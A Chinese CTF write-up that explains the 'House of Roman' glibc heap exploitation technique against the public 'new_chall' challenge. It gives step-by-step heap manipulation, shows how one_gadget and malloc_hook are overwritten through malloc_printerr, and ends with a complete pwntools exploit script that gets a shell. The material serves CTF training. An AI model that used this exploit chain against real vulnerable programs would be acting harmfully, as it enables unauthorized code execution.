[TOC]

# House of Roman

## 介绍：

1. House of Roman 这个技巧说简单点其实就是 **fastbin attack** 和 **Unsortbin attack** 结合的一个小 trick。
2. 该技术用于 **bypass ALSR**，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。

应用场景：没show函数，且got表无法修改。

## 原理：

前提：关闭alsr：**sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'**

1. 修改 FD 指向 **malloc_hook** 
2. 里利用unsorted bin，往 malloc_hook 写入 main_arena_88
3. 再局部修改main_arena_88 ==> onegadget

## 例子：

题目地址：[House-Of-Roman](https://github.com/romanking98/House-Of-Roman/blob/master/new_chall)

### 思路：

1. 利用**mian_arena_88**地址来覆盖fastbin的fd指针，再**修改低位字节** 使之指向malloc_hook-0x23。
2. 再利用unsorted bin attack向malloc_hook写入main_arena_88。
3. 然后申请到包含malloc_hook的chunk，进而修改上面的main_arena_88的低3字节，使之指向one_gadget。
4. 再触发malloc_hook ==》这里介绍**两种触发malloc_hook**的链。

![image-20240819204110543](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408192041686.png)

### 分析：

1. 没有show函数，开PIE，改got表基本行不通：

   ![image-20240819165823604](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191658702.png)

   ![image-20240819165850250](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191658317.png)

2. free函数中存在UAF漏洞，edit存在off_by_one漏洞：

   ![image-20240819165937153](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191659201.png)

   ![image-20240819170005968](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191700025.png)

### 利用：

1. 先利用**mian_arena_88**地址来覆盖fastbin的fd指针，并修改指向malloc_hook-0x23：

   * 利用off_by_one修改size字段，造成overlap，这里要在下一个chunk中伪造好fake_chunk，使之衔接到top_chunk，可以看这篇文章后面又仔细介绍： [伪造unsortedbin释放时 top chunk的衔接问题](https://blog.csdn.net/yjh_fnu_ltn/article/details/140830566?spm=1001.2014.3001.5501) 。
   * 释放进入unsorted bin之后，再申请相应大小的chunk，使main_arena_88地址覆盖fd指针

   ```py
   add(0x18,0)
   add(0x58,1)
   add(0x68,2)
   
   # malloc malloc_hook
   edit(0,p64(0)*3+b"\x91") #修改size
   edit(2,p64(0)*5 + p64(0x11) + p64(0) + p64(1))	#fake_chunk
   free(1)
   free(2)	#安排进入fastbin
   add(0x58,3)	#推动main_arena_88地址覆盖掉fastbin的fd指针，这里fastbin中chunk的size会被修改
   edit(3,p64(0)*11 + b"\x71") #改回fastbin的size，后面申请chunk使会检查size
   edit(2,b"\xed\x4a")
   add(0x68,4)
   add(0x68,5)
   
   edit(5,b"AAAAAAAA")
   ```

   推动地址之前的堆分布：

   ![image-20240819171346343](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191713463.png)

   推动地址之后的堆分布，可以看到fd指针被成功覆盖掉：

   ![image-20240819171641883](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191716009.png)

   局部修改fd指针，使之指向**malloc_hook-0x23** ，后面就能直接申请到包含malloc_hook的chunk了：

   ![image-20240819172040371](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191720564.png)

2. 构造unsorted bin attack，向malloc_hook处写入main_arena地址：

   ```py
   # unsorted bin attack
   free(4)
   edit(4,p64(0))
   add(0x68,10)
   edit(2,p64(0) + b"\x00")
   add(0x68,1)
   ```

   ![image-20240819172433714](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191724895.png)

   修改后成功指向malloc_hook：

   ![image-20240819172510092](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191725226.png)

   触发unsorted bin attack 向malloc_hook上写入main_arena_88地址：

   ![image-20240819172618749](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191726817.png)

3. 局部修改malloc_hook上的地址，使之能指向onegadget:

   ```py
   # 填入 one_gadget
   one_gadget = [0x4527a,0xf03a4,0xf1247]
   edit(5,p64(0)*2 + b"\x00"*3 + b"\xa4\x03\x8f")
   
   ```

   但是我们在程序中是没有获得libc地址的，那要如何得到one_gadget地址呢，就需要采用12bit爆破来一个一个试了：

   最低的3位0x3a4是一定和one_gadget偏移相同的，随意只需要爆破中间的3位，这里就是0x8f0，一共是12bit，所以需要爆破12bit，1/4096的概率，应该是能爆出来的，这里我就直接填进去了。

   ![image-20240819173232004](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191732207.png)

4. 最后是触发malloc_hook函数指针，平常的方法是再申请一个chunk，在_int_malloc函数中就会检查malloc_hook:

   ```py
   add(0x68,1)	# malloc触发
   
   free(4)	# 报错后使用malloc_printerr函数触发
   free(4)
   ```

   先看第一种，malloc来触发：

   这里_libc_malloc函数中检查malloc_hook指针是否为空

   ![image-20240819174019574](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191740691.png)

   调用malloc_hook处的函数，但是可以看到one_gadget的使用条件并不达标，[rsp+0x50] != 0，所以这个one_gadget不符合，使用另外两个one_gadget条件任然不符合约束，主要是该位置的栈布局达不到one_gadget执行的条件，所以难道one_gadget直接pass掉了？如果能换一个栈布局或许one_gadget约束就能达成了呢：

   ![image-20240819174257813](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191742892.png)

   

   所以要换一个别的栈空间，来匹配one_gadget执行，那还有什么方法能够不直接调用malloc，从而执行malloc_hook呢？那就是报错，使用malloc_printerr函数来变向调用malloc函数，下面观察malloc_printerr函数调用malloc函数时的栈，利用double free来触发malloc_printerr：

   ![image-20240819175301047](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191753206.png)

   上面可以看到调用触发malloc_printerr后，继续调用了一长串函数，最终调用到了malloc函数，这时的栈空间与直接调用malloc函数时肯定不一样：

   刚好满足one_gadget的约束条件，所以使用malloc_printerr函数简介调用malloc可以满足约束。

   ![image-20240819175650369](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191756547.png)

   成功getshell：

   ![image-20240819175753261](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191757386.png)

   如果换一种方法触发malloc_printerr函数报错，是否也能间接调用malloc函数呢：

   利用完unsorted bin attack后，此时unsorted bin被破坏，再释放一个unsorted bin可定会报错

   ![image-20240819180353598](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191803759.png)

   虽然报错方法不一样，但是后面调用到malloc_printerr函数，最后也能间接调用到malloc函数：

   ![image-20240819181101726](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191811910.png)

   ![image-20240819180921807](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191809990.png)

   并且getshell，拿到flag，可以看到这里报错和前面double free不一样：

   ![image-20240819181243445](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191812559.png)

5. **fastbin检查double free**，进而调用malloc_printerr函数报错的源码：

   ![image-20240819180001842](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191800895.png)

   ![image-20240819175942571](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408191759637.png)

6. 完整EXP：

   ```py
   from pwn import *
   import numpy as np
   # from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   
   
   def debug():
       gdb.attach(p)
   
   def add(size,index):
       p.sendlineafter(b'ee',b'1')
       p.sendlineafter(b':',str(size).encode())
       p.sendlineafter(b':',str(index).encode())
       # p.sendafter(b"?",name)
   
   def edit(index,content):
       p.sendlineafter(b'ee',b'2')
       p.sendlineafter(b':',str(index).encode())
       # p.sendlineafter(b":",str(len(content)).encode())
       p.sendafter(b":",content)
   
   # def show():
   #     p.sendlineafter(b':',b'3')
   
   def free(index):
       p.sendlineafter(b'ee',b'3')
       p.sendlineafter(b':',str(index).encode())
   
   # p = remote("node4.anna.nssctf.cn",28864)
   # libc = ELF('./libc.so.6')
   p = process("./new_chall") 
   libc = ELF("/home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
   # elf = ELF("./pwn")
   
   # unsorted bin ==> malloc_hook ==> unsorted bin attack
   p.sendline(b"lzl")
   add(0x18,0)
   add(0x58,1)
   add(0x68,2)
   add(0x100,9)
   add(0x18,6)
   
   # malloc malloc_hook
   edit(0,p64(0)*3+b"\x91")
   edit(2,p64(0)*5 + p64(0x11) + p64(0) + p64(1))
   free(1)
   free(2)
   
   add(0x58,3)
   edit(3,p64(0)*11 + b"\x71")
   edit(2,b"\xed\x4a")
   add(0x68,4)
   add(0x68,5)
   
   edit(5,b"AAAAAAAA")
   
   # unsorted bin attack
   free(4)
   edit(4,p64(0))
   add(0x68,10)
   
   edit(2,p64(0) + b"\x00")
   add(0x68,1)
   
   # 填入 one_gadget
   one_gadget = [0x4527a,0xf03a4,0xf1247]
   edit(5,p64(0)*2 + b"\x00"*3 + b"\xa4\x03\x8f")
   # edit(5,p64(0)*2 + b"\x00"*3 + b"\x47\x12\x8f")
   # edit(5,p64(0)*2 + b"\x00"*3 + b"\x7a\x52\x84")
   
   debug()
   free(9)		#unsorted bin报错
   
   #free(4)	#fastbin中的double free报错
   #free(4)
   p.sendline(b"cat flag")
   p.interactive()
   ```

   
